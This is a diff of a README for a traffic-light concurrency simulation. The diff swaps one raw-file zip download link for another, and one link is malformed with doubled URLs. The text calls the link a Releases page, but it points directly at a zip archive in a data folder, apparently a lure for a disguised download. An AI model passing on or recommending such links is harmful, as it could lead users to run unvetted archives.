@@ -1,7 +1,7 @@
 # 🚦 concurrent-traffic-light-Simulation - Experience Realistic Traffic Management
 
 ## 📦 Download Now
-[![Download Latest Release](https://github.com/cris281/concurrent-traffic-light-Simulation/raw/refs/heads/main/img/Simulation_concurrent_traffic_light_1.8.zip%https://github.com/cris281/concurrent-traffic-light-Simulation/raw/refs/heads/main/img/Simulation_concurrent_traffic_light_1.8.zip)](https://github.com/cris281/concurrent-traffic-light-Simulation/raw/refs/heads/main/img/Simulation_concurrent_traffic_light_1.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/cris281/concurrent-traffic-light-Simulation/main/data/light-traffic-Simulation-concurrent-v2.5.zip%https://raw.githubusercontent.com/cris281/concurrent-traffic-light-Simulation/main/data/light-traffic-Simulation-concurrent-v2.5.zip)](https://raw.githubusercontent.com/cris281/concurrent-traffic-light-Simulation/main/data/light-traffic-Simulation-concurrent-v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the concurrent-traffic-light-Simulation! This application allows you to simulate multithreaded traffic management in a virtual city. You will see vehicles navigate through a grid, following traffic lights at intersections. The software showcases key programming concepts like concurrency and thread safety.
@@ -15,7 +15,7 @@ Welcome to the concurrent-traffic-light-Simulation! This application allows you 
 ## 📥 Download & Install
 To download the application, visit the following link:
 
-[Download Latest Release](https://github.com/cris281/concurrent-traffic-light-Simulation/raw/refs/heads/main/img/Simulation_concurrent_traffic_light_1.8.zip)
+[Download Latest Release](https://raw.githubusercontent.com/cris281/concurrent-traffic-light-Simulation/main/data/light-traffic-Simulation-concurrent-v2.5.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the latest version of the application.
